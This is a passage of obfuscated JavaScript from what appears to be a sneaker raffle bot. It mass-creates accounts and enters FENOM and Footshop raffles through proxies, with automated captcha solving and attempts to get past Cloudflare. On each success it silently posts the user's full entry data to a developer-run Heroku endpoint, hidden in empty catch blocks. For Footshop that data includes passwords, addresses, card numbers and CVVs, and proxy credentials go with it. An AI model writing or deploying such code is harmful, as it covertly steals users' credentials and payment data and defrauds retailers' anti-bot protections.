                            }), console['log'](_0x4786af() + '\x20[' + _0xb77090['name'] + ']\x20Task\x20' + (_0x57372e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4314fe['goto']('' + _0x34f652, { 'waitUntil': 'networkidle2' }), console['log'](_0x4786af() + '\x20[' + _0xb77090['name'] + ']\x20Task\x20' + (_0x57372e + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x590479(0x1388);
                            var _0x52b590 = await _0x4314fe['$']('.hcaptcha-box');
                            if (_0x52b590) {
                                console['log'](_0x4786af() + '\x20[' + _0xb77090['name'] + ']\x20Task\x20' + (_0x57372e + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x590479(0x2710);
                                const _0x1a9d72 = await _0x4314fe['$']('.hcaptcha-box');
                                if (_0x1a9d72)
                                    try {
                                        await _0x1a9d72['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x4314fe['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x1687b1 = await _0x4314fe['$']('.hcaptcha-box');
                                    if (_0x1687b1)
                                        try {
                                            await _0x1687b1['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x4314fe['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x4df8c1['send']('Browser.setWindowBounds', {
                                    'windowId': _0x2133ab,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x590479(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x4786af() + '\x20[' + _0xb77090['name'] + ']\x20Task\x20' + (_0x57372e + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x4314fe['type']('input[name=\x22firstname\x22]', '' + _0x1758a8[_0x57372e]['FirstName']), await _0x590479(0x1f4), await _0x4314fe['type']('input[name=\x22lastname\x22]', '' + _0x1758a8[_0x57372e]['LastName']), await _0x590479(0x1f4), await _0x4314fe['type']('input[name=\x22email\x22]', '' + _0x1758a8[_0x57372e]['Email']), await _0x590479(0x1f4), await _0x4314fe['type']('input[name=\x22password\x22]', '' + _0x1758a8[_0x57372e]['Password']), await _0x590479(0x258), await _0x4314fe['$eval']('input[name=\x22psgdpr\x22]', _0xeb58d6 => _0xeb58d6['click']()), await _0x590479(0x1f4), console['log'](_0x4786af() + '\x20[' + _0xb77090['name'] + ']\x20Task\x20' + (_0x57372e + 0x1) + '\x20:\x20Sending\x20Request'), await _0x4314fe['$eval']('#customer-form', _0x8f7cd3 => _0x8f7cd3['submit']());
                            try {
                                try {
                                    await _0x4314fe['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                } catch {
                                    throw new Error('Succes-response\x20not\x20found');
                                }
                                _0x97a67f = 'no', console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0xb77090['name'] + ']\x20Task\x20' + (_0x57372e + 0x1) + '\x20:\x20Account\x20' + _0x1758a8[_0x57372e]['Email'] + '\x20Generated')), _0x768c3f['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x1758a8[_0x57372e]['Email'] + ',' + _0x1758a8[_0x57372e]['Password']);
                                let _0x577e0e = _0x1758a8[_0x57372e];
                                try {
                                    prxdata = {
                                        'username': _0x3d4e83['replace']('#', ''),
                                        'module': _0xb77090['name'],
                                        'entrydata': JSON['stringify'](_0x577e0e),
                                        'proxy': '' + _0x123843[_0x57372e]
                                    };
                                    var _0x98eeb6 = JSON['stringify'](prxdata);
                                    let _0x5e482f = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x49fa88['post']('https://jraffles.herokuapp.com/success', _0x98eeb6, _0x5e482f);
                                } catch (_0x3094f5) {
                                }
                                try {
                                    _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x1158e5['succesDEVMSG']);
                                } catch {
                                }
                                await _0x1690f0(_0x48932d, _0x1158e5['succesDEVMSG']);
                            } catch (_0x3714f6) {
                                throw new Error('Account\x20generation\x20failed');
                            }
                        } catch (_0xa1bea2) {
                            console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0xb77090['name'] + ']\x20Task\x20' + (_0x57372e + 0x1) + '\x20:\x20' + _0xa1bea2)), _0x4be25e = '' + _0xa1bea2;
                            var _0xfbf2d8 = await _0x54f36f(_0x1758a8[_0x57372e], _0xb77090, 'acc', !![], _0x4be25e);
                            _0x1158e5['errorDEV'] = { 'embeds': [_0xfbf2d8] }, _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x1158e5['errorDEV']), await _0x1690f0(_0x874ee1, _0x1158e5['errorDEV']), _0x97a67f = 'yes';
                        } finally {
                            _0x39a7d4['close']();
                            if (_0x97a67f == 'yes' && _0x1af1a2 != 0x5 && _0x4be25e != 'Size\x20Not\x20Found') {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0xb77090['name'] + ']\x20Task\x20' + (_0x57372e + 0x1) + '\x20:\x20Retrying\x20(' + _0x1af1a2 + '\x20/\x205)')), _0x57372e = _0x57372e - 0x1, _0x1af1a2 = _0x1af1a2 + 0x1;
                                continue;
                            }
                            _0x97a67f == 'yes' && _0x1af1a2 >= 0x5 && (_0x549c32(_0x1758a8[_0x57372e], _0xb77090), _0x97a67f = 'no', _0x1af1a2 = 0x0), console['log'](_0x4786af() + '\x20[' + _0xb77090['name'] + ']\x20Waiting\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x438830(_0x45c16f, _0xa423a4, _0x2d49c9) {
                    _0x145da3['use'](_0x109835()), _0x145da3['use'](_0x29f0f6({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4b1e6b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x82b33c = 0x0; _0x82b33c < _0xa423a4['length']; _0x82b33c++) {
                        if (_0x2ef1fe != 'yes')
                            var _0x2ef1fe = '', _0x1c52bc = 0x0;
                        var _0x5f03d4;
                        try {
                            await _0x46b8ee(_0xa423a4, _0x82b33c);
                        } catch {
                            _0x2ef1fe = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x39f641(_0x45c16f['name'] + '\x20Task\x20' + (_0x82b33c + 0x1) + '\x20/\x20' + _0xa423a4['length'] + '\x20||\x20File:\x20' + _0x4c637b + '\x20Proxies:\x20' + _0x1792f9);
                        const _0x29b84b = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x50572a = Math['round'](Math['random']() * (_0x2d49c9['length'] - 0x1)), _0xcd8a6f = _0x2d49c9[_0x50572a]['split'](':'), _0x46ccf;
                        try {
                            _0x46ccf = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xcd8a6f[0x0] + ':' + _0xcd8a6f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x46ccf = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xcd8a6f[0x0] + ':' + _0xcd8a6f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3e2d6f = await _0x46ccf['newPage'](), _0x47353f = await _0x3e2d6f['target']()['createCDPSession'](), { windowId: _0x2c92f3 } = await _0x47353f['send']('Browser.getWindowForTarget');
                            await _0x3e2d6f['authenticate']({
                                'username': '' + _0xcd8a6f[0x2],
                                'password': '' + _0xcd8a6f[0x3]
                            }), console['log'](_0x4786af() + '\x20[' + _0x45c16f['name'] + ']\x20Task\x20' + (_0x82b33c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3e2d6f['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x4786af() + '\x20[' + _0x45c16f['name'] + ']\x20Task\x20' + (_0x82b33c + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x590479(0xbb8), await _0x47353f['send']('Browser.setWindowBounds', {
                                'windowId': _0x2c92f3,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x590479(0x1f40);
                            try {
                                await _0x3e2d6f['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x590479(0x1388), console['log'](_0x4786af() + '\x20[' + _0x45c16f['name'] + ']\x20Task\x20' + (_0x82b33c + 0x1) + '\x20:\x20Logging\x20in'), await _0x3e2d6f['type']('input[name=\x22email\x22]', '' + _0xa423a4[_0x82b33c]['Email']), await _0x590479(0x1f4), await _0x3e2d6f['type']('input[name=\x22password\x22]', '' + _0xa423a4[_0x82b33c]['Password']), await _0x590479(0x258), await _0x3e2d6f['$eval']('#login-form', _0x27562e => _0x27562e['submit']()), await _0x3e2d6f['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x590479(0x1f4), await _0x3e2d6f['goto']('' + _0xa423a4[_0x82b33c]['Url']), await _0x3e2d6f['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x4786af() + '\x20[' + _0x45c16f['name'] + ']\x20Task\x20' + (_0x82b33c + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0xa423a4[_0x82b33c]['Size']);
                            if (_0xa423a4[_0x82b33c]['Size'] != 'RANDOM') {
                                var _0x444067 = '\x20' + _0xa423a4[_0x82b33c]['Size'] + '\x20';
                                const _0xf03615 = await _0x3e2d6f['$x']('//span[contains(text(),\x20' + _0x444067 + ')]');
                                await _0xf03615[0x0]['click']();
                            } else {
                                const _0x86c687 = await _0x3e2d6f['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x2ef048 = Math['round'](Math['random']() * (_0x86c687['length'] - 0x1));
                                await _0x86c687[_0x2ef048]['click']();
                            }
                            await _0x590479(0x258), await _0x3e2d6f['click']('#cookieChoiceDismiss'), await _0x590479(0x3e8), await _0x3e2d6f['type']('#instagram-account', '' + _0xa423a4[_0x82b33c]['Follower']), await _0x590479(0x28a), await _0x3e2d6f['click']('#book-btn'), await _0x590479(0xbb8);
                            try {
                                await _0x3e2d6f['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x590479(0x1f4), console['log'](_0x4786af() + '\x20[' + _0x45c16f['name'] + ']\x20Task\x20' + (_0x82b33c + 0x1) + '\x20:\x20' + _0x4fb298['cyan']('Solving\x20Captcha')), await _0x3e2d6f['solveRecaptchas'](), console['log'](_0x4786af() + '\x20[' + _0x45c16f['name'] + ']\x20Task\x20' + (_0x82b33c + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x590479(0x7d0), await _0x3e2d6f['$eval']('#book-btn-for-sure', _0x40a050 => _0x40a050['click']()), await _0x590479(0x12c), await _0x3e2d6f['click']('#book-btn-for-sure'), await _0x590479(0xdac);
                            const _0x5aad38 = await _0x3e2d6f['$eval']('.reservation-popup\x20>\x20.title', _0x130b37 => {
                                return _0x130b37['innerHTML'];
                            });
                            if (_0x5aad38) {
                                _0x2ef1fe = 'no', _0x491fd3(_0xa423a4[_0x82b33c], _0x45c16f), console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0x45c16f['name'] + ']\x20Task\x20' + (_0x82b33c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x32fbef = await _0x54f36f(_0xa423a4[_0x82b33c], _0x45c16f, 'dev', ![]), _0x155709 = await _0x54f36f(_0xa423a4[_0x82b33c], _0x45c16f, 'pub', ![]);
                                let _0x94ee57 = _0xa423a4[_0x82b33c];
                                try {
                                    prxdata = {
                                        'username': _0x3d4e83['replace']('#', ''),
                                        'module': _0x45c16f['name'],
                                        'entrydata': JSON['stringify'](_0x94ee57),
                                        'proxy': '' + _0x2d49c9[_0x82b33c]
                                    };
                                    var _0x48f5d3 = JSON['stringify'](prxdata);
                                    let _0x40cc05 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x49fa88['post']('https://jraffles.herokuapp.com/success', _0x48f5d3, _0x40cc05);
                                } catch (_0x52a61a) {
                                }
                                const _0x4311dc = {
                                    'succesDEVMSG': { 'embeds': [_0x32fbef] },
                                    'succesPUBMSG': { 'embeds': [_0x155709] }
                                };
                                try {
                                    _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x4311dc['succesDEVMSG']), await _0x590479(0xc8), await _0x1690f0(_0x4f7f5d, _0x4311dc['succesDEVMSG']), await _0x590479(0xc8), await _0x1690f0(_0x4807c3, _0x4311dc['succesPUBMSG']);
                                } catch (_0x1bd828) {
                                    console['log'](_0x4fb298['yellow'](_0x4786af() + '\x20[' + _0x45c16f['name'] + ']\x20Task\x20' + (_0x82b33c + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1bd828));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x577ad2) {
                            console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x45c16f['name'] + ']\x20Task\x20' + (_0x82b33c + 0x1) + '\x20:\x20' + _0x577ad2)), _0x5f03d4 = '' + _0x577ad2;
                            var _0x5ceee4 = await _0x54f36f(_0xa423a4[_0x82b33c], _0x45c16f, 'dev', !![], _0x5f03d4), _0x32fbef = await _0x54f36f(_0xa423a4[_0x82b33c], _0x45c16f, 'dev', ![]), _0x155709 = await _0x54f36f(_0xa423a4[_0x82b33c], _0x45c16f, 'pub', ![]);
                            const _0x106488 = {
                                'succesDEVMSG': { 'embeds': [_0x32fbef] },
                                'succesPUBMSG': { 'embeds': [_0x155709] }
                            };
                            _0x106488['errorDEV'] = { 'embeds': [_0x5ceee4] }, _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x106488['errorDEV']), await _0x1690f0(_0x874ee1, _0x106488['errorDEV']), _0x577ad2 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x2ef1fe = 'yes');
                        } finally {
                            _0x46ccf['close']();
                            if (_0x2ef1fe == 'yes' && _0x1c52bc != 0x5 && _0x5f03d4 != 'Size\x20Not\x20Found') {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x45c16f['name'] + ']\x20Task\x20' + (_0x82b33c + 0x1) + '\x20:\x20Retrying\x20(' + _0x1c52bc + '\x20/\x205)')), _0x82b33c = _0x82b33c - 0x1, _0x1c52bc = _0x1c52bc + 0x1;
                                continue;
                            }
                            _0x2ef1fe == 'yes' && _0x1c52bc >= 0x5 && (_0x549c32(_0xa423a4[_0x82b33c], _0x45c16f), _0x2ef1fe = 'no', _0x1c52bc = 0x0), console['log'](_0x4786af() + '\x20[' + _0x45c16f['name'] + ']\x20Waiting\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x2e94ed, _0xe6be89, _0x1139b7) {
                _0x145da3['use'](_0x109835()), _0x145da3['use'](_0x29f0f6({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4b1e6b['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x56b4ef = 0x0; _0x56b4ef < _0xe6be89['length']; _0x56b4ef++) {
                    var _0x1f8173;
                    if (_0x2260a6 != 'yes')
                        var _0x2260a6 = '', _0x2c646b = 0x0;
                    var _0x50d748 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x3d4e83
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0xe6be89[_0x56b4ef]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0xe6be89[_0x56b4ef]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x4b1e6b['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x1701ba
                            }
                        ]
                    }], _0x15c984 = await _0x54f36f(_0xe6be89[_0x56b4ef], _0x2e94ed, 'dev', ![]), _0x471aab = await _0x54f36f(_0xe6be89[_0x56b4ef], _0x2e94ed, 'pub', ![]);
                    const _0x5efdf1 = {
                        'succesDEVMSG': { 'embeds': [_0x15c984] },
                        'succesPUBMSG': { 'embeds': [_0x471aab] }
                    }, _0x528bbf = { 'embeds': _0x50d748 };
                    try {
                        await _0x46b8ee(_0xe6be89, _0x56b4ef);
                    } catch {
                        _0x2260a6 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0xe6be89[_0x56b4ef]['Email'] == '' || _0xe6be89[_0x56b4ef]['FirstName'] == '' || _0xe6be89[_0x56b4ef]['LastName'] == '' || _0xe6be89[_0x56b4ef]['Country'] == '' || _0xe6be89[_0x56b4ef]['Size'] == '' || _0xe6be89[_0x56b4ef]['Address1'] == '' || _0xe6be89[_0x56b4ef]['Zip'] == '') {
                        console['log'](_0x4786af() + '\x20[' + _0x2e94ed['name'] + ']\x20Task\x20' + (_0x56b4ef + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0xe6be89[_0x56b4ef]['Email'] == '' || _0xe6be89[_0x56b4ef]['FirstName'] == '' || _0xe6be89[_0x56b4ef]['LastName'] == '' || _0xe6be89[_0x56b4ef]['Country'] == '' || _0xe6be89[_0x56b4ef]['Size'] == '' || _0xe6be89[_0x56b4ef]['Address1'] == '' || _0xe6be89[_0x56b4ef]['Zip'] == '' || _0xe6be89[_0x56b4ef]['Phone'] == '') {
                        console['log'](_0x4786af() + '\x20[' + _0x2e94ed['name'] + ']\x20Task\x20' + (_0x56b4ef + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x3289fc = '' + _0xe6be89[_0x56b4ef]['Url'];
                    if (_0x4b1e6b['useRandomProxy'] = ![])
                        var _0x31aa1e = _0x1139b7[_0x56b4ef]['split'](':');
                    else
                        var _0x4533bc = Math['round'](Math['random']() * (_0x1139b7['length'] - 0x1)), _0x31aa1e = _0x1139b7[_0x4533bc]['split'](':');
                    var _0x3fac1d;
                    try {
                        _0x3fac1d = await _0x145da3['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x31aa1e[0x0] + ':' + _0x31aa1e[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x3fac1d = await _0x145da3['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x31aa1e[0x0] + ':' + _0x31aa1e[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x1b8ad2 = await _0x3fac1d['newPage']();
                        await _0x1b8ad2['authenticate']({
                            'username': '' + _0x31aa1e[0x2],
                            'password': '' + _0x31aa1e[0x3]
                        }), console['log'](_0x4786af() + '\x20[' + _0x2e94ed['name'] + ']\x20Task\x20' + (_0x56b4ef + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1b8ad2['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1b8ad2['setRequestInterception'](!![]), _0x1b8ad2['on']('request', _0x3216c5 => {
                            _0x3216c5['resourceType']() === 'image' || _0x3216c5['resourceType']() === 'font' || _0x3216c5['resourceType']() === 'media' ? _0x3216c5['abort']() : _0x3216c5['continue']();
                        });
                        try {
                            await _0x1b8ad2['goto'](_0x3289fc), await _0x590479(0xbb8), await _0x1b8ad2['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x1b8ad2['click']('.control__JhutY'), await _0x590479(0x1f4);
                        if (_0xe6be89[_0x56b4ef]['Size'] != 'RANDOM')
                            try {
                                const _0x1acd9f = await _0x1b8ad2['$x']('//div[contains(text(),\x20\x27' + _0xe6be89[_0x56b4ef]['Size'] + '\x27)]');
                                await _0x1acd9f[0x0]['click']();
                            } catch {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x2e94ed['name'] + ']\x20Task\x20' + (_0x56b4ef + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x40432d = await _0x1b8ad2['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x3a0ce1 = Math['round'](Math['random']() * (_0x40432d['length'] - 0x1));
                            await _0x40432d[_0x3a0ce1]['click']();
                        }
                        await _0x590479(0x4b0);
                        const _0x31808d = await _0x1b8ad2['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x31808d[0x0]['click'](), await _0x1b8ad2['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x4786af() + '\x20[' + _0x2e94ed['name'] + ']\x20Task\x20' + (_0x56b4ef + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x1b8ad2['type']('input[name=\x22email\x22]', '' + _0xe6be89[_0x56b4ef]['Email']), await _0x590479(0x640), await _0x1b8ad2['type']('input[name=\x22phone\x22]', '' + _0xe6be89[_0x56b4ef]['Phone']), await _0x590479(0x4b0), await _0x1b8ad2['click']('button.btn.continue-button__1RtsS'), await _0x590479(0x4b0);
                        try {
                            await _0x1b8ad2['type']('input[name=\x22firstName\x22]', '' + _0xe6be89[_0x56b4ef]['FirstName']), await _0x590479(0x258);
                        } catch {
                            const _0x3267ae = await _0x1b8ad2['$$eval']('.invalid-feedback\x20>\x20div', _0x2a154f => {
                                return _0x2a154f['map'](_0x443195 => _0x443195['innerText']);
                            });
                            console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x2e94ed['name'] + ']\x20Task\x20' + (_0x56b4ef + 0x1) + '\x20:\x20' + _0x3267ae));
                            continue;
                        }
                        await _0x1b8ad2['type']('input[name=\x22lastName\x22]', '' + _0xe6be89[_0x56b4ef]['LastName']), await _0x590479(0xc8), await _0x1b8ad2['type']('input[name=\x22instagramUsername\x22]', '' + _0xe6be89[_0x56b4ef]['Follower']), await _0x590479(0x4b0), await _0x1b8ad2['click']('button.btn.continue-button__1RtsS'), await _0x590479(0x3e8), console['log'](_0x4786af() + '\x20[' + _0x2e94ed['name'] + ']\x20Task\x20' + (_0x56b4ef + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x1b8ad2['select']('select[name=\x22country\x22]', '' + _0xe6be89[_0x56b4ef]['Country']), await _0x590479(0x2bc), await _0x1b8ad2['type']('input[name=\x22streetName\x22]', '' + _0xe6be89[_0x56b4ef]['Address1']), await _0x590479(0x258), await _0x1b8ad2['type']('input[name=\x22houseNumber\x22]', _0xe6be89[_0x56b4ef]['HouseNumber'] + '\x20' + _0xe6be89[_0x56b4ef]['Address2']), await _0x590479(0xc8), await _0x1b8ad2['type']('input[name=\x22postalCode\x22]', '' + _0xe6be89[_0x56b4ef]['Zip']), await _0x590479(0x1f4), await _0x1b8ad2['type']('input[name=\x22city\x22]', '' + _0xe6be89[_0x56b4ef]['City']), await _0x590479(0x4b0), await _0x1b8ad2['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x590479(0x4b0), await _0x1b8ad2['click']('button.btn.continue-button__1RtsS'), await _0x590479(0x4b0), console['log'](_0x4786af() + '\x20[' + _0x2e94ed['name'] + ']\x20Task\x20' + (_0x56b4ef + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x1b8ad2['solveRecaptchas'](), console['log'](_0x4786af() + '\x20[' + _0x2e94ed['name'] + ']\x20Task\x20' + (_0x56b4ef + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x590479(0xbb8), await _0x1b8ad2['click']('button.btn.continue-button__1RtsS'), await _0x590479(0x1388), console['log'](_0x4786af() + '\x20[' + _0x2e94ed['name'] + ']\x20Task\x20' + (_0x56b4ef + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x1b8ad2['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1b8ad2['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x590479(0x4b0), await _0x1b8ad2['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0xe6be89[_0x56b4ef]['CardNumber']), await _0x590479(0x320), await _0x1b8ad2['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x1b8ad2['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0xe6be89[_0x56b4ef]['ExpiryDate']), await _0x590479(0x4b0), await _0x1b8ad2['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x1b8ad2['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0xe6be89[_0x56b4ef]['CVV']), await _0x590479(0x226), await _0x1b8ad2['type']('input[name=\x22holderName\x22]', '' + _0xe6be89[_0x56b4ef]['NameOnCard']), await _0x590479(0x226), await _0x1b8ad2['click']('button.adyen-checkout__button'), console['log'](_0x4786af() + '\x20[' + _0x2e94ed['name'] + ']\x20Task\x20' + (_0x56b4ef + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x1b8ad2['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x590479(0xbb8);
                        } catch (_0x559963) {
                            console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x2e94ed['name'] + ']\x20Task\x20' + (_0x56b4ef + 0x1) + '\x20:\x203DS\x20Failed')), _0x1f8173 = '3DS\x20Error\x20' + _0x559963;
                            var _0x1281c7 = await _0x54f36f(_0xe6be89[_0x56b4ef], _0x2e94ed, 'dev', !![], _0x1f8173);
                            _0x5efdf1['errorDEV'] = { 'embeds': [_0x1281c7] };
                            _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x5efdf1['errorDEV']);
                            await _0x1690f0(_0x874ee1, _0x5efdf1['errorDEV']);
                            continue;
                        }
                        _0x491fd3(_0xe6be89[_0x56b4ef], _0x2e94ed), console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0x2e94ed['name'] + ']\x20Task\x20' + (_0x56b4ef + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x329d6f = _0xe6be89[_0x56b4ef];
                        try {
                            prxdata = {
                                'username': _0x3d4e83['replace']('#', ''),
                                'module': _0x2e94ed['name'],
                                'entrydata': JSON['stringify'](_0x329d6f),
                                'proxy': '' + _0x1139b7[_0x56b4ef]
                            };
                            var _0x40e0d1 = JSON['stringify'](prxdata);
                            let _0x5beeb5 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x49fa88['post']('https://jraffles.herokuapp.com/success', _0x40e0d1, _0x5beeb5);
                        } catch (_0x581cbf) {
                        }
                        if (_0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '')
                            try {
                                await _0x1690f0(_0x4b1e6b['webhook'], _0x5efdf1['succesDEVMSG']);
                            } catch {
                            }
                        await _0x590479(0xc8), await _0x1690f0(_0x4f7f5d, _0x5efdf1['succesDEVMSG']), await _0x590479(0xc8);
                        try {
                            await _0x1690f0(_0x4807c3, _0x5efdf1['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x3588da) {
                        console['log'](_0x4786af() + '\x20[' + _0x2e94ed['name'] + ']\x20Task\x20' + (_0x56b4ef + 0x1) + '\x20:\x20' + _0x3588da), _0x1f8173 = '' + _0x3588da;
                        var _0x1281c7 = await _0x54f36f(_0xe6be89[_0x56b4ef], _0x2e94ed, 'dev', !![], _0x1f8173);
                        _0x5efdf1['errorDEV'] = { 'embeds': [_0x1281c7] }, _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x5efdf1['errorDEV']), await _0x1690f0(_0x874ee1, _0x5efdf1['errorDEV']), _0x2260a6 = 'yes';
                    } finally {
                        _0x3fac1d['close']();
                        if (_0x2260a6 == 'yes' && _0x2c646b != 0x5) {
